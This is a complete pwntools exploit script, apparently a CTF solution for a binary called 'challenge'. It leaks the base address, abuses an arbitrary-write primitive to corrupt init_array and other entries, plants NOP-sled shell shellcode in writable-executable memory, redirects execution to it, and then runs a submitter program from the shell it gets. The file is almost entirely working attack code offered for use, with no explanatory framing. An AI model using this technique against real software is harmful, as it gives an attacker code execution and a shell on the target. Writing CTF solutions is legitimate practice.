# https://github.com/MarcoMeinardi/spwn

from pwn import *

var = os.getenv("DEBUGINFOD_URLS")

binary_name = "challenge"
exe  = ELF(binary_name, checksec=True)
context.binary = exe

ru	= lambda *x: r.recvuntil(*x)
rl	= lambda *x: r.recvline(*x)
rc	= lambda *x: r.recv(*x)
sla = lambda *x: r.sendlineafter(*x)
sa	= lambda *x: r.sendafter(*x)
sl	= lambda *x: r.sendline(*x)
sn	= lambda *x: r.send(*x)

if var is None:
	HOST = os.environ.get("HOST", "localhost")
	PORT = 31337
	r = connect(HOST, int(PORT))
elif args.GDB:
	r = gdb.debug(f"./{binary_name}", """
		c
	""", aslr=False)
else:
	r = process(f"./{binary_name}")

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        print(f"-> {u64(lst[i:i + n]):#x}")
        yield u64(lst[i:i + n])


def arbw(where, what):
    r.send(p64(where))
    if where:
        r.send(p64(what))

def main():
    exe.address = u64(r.recv(8))
    log.warning("exe.address : 0x%x", exe.address)

    # arbw(exe.address + 0x004330, exe.address + 0x0015A5)
    arbw(exe.address + 0x004330, exe.address + 0x001370) # re enable rwx in init array
    arbw(exe.address + 0x0045C4, 0x41414141)
    arbw(exe.address + 0x04338, exe.address + 0x2000)
    # arbw(exe.address + 0x04338+0x8, 0x0)
    arbw(0x0, 0x0)
    
    r.send(b"A"*4)

    shc = b"\x90"*0x100 + asm(shellcraft.sh()).rjust(48, b"\x90")
    i = 0
    for num in list(chunks(shc, 8)):
        arbw(exe.address + 0x2000 + 0x500 + i*8, num)
        i+=1

    arbw(exe.address + 0x20a9, u64(asm("jmp $+0x500").ljust(8, b"\x90")))
    time.sleep(1)
    r.sendline("./submitter")
    print(r.recvall(timeout=1))

main()
# after shell xd
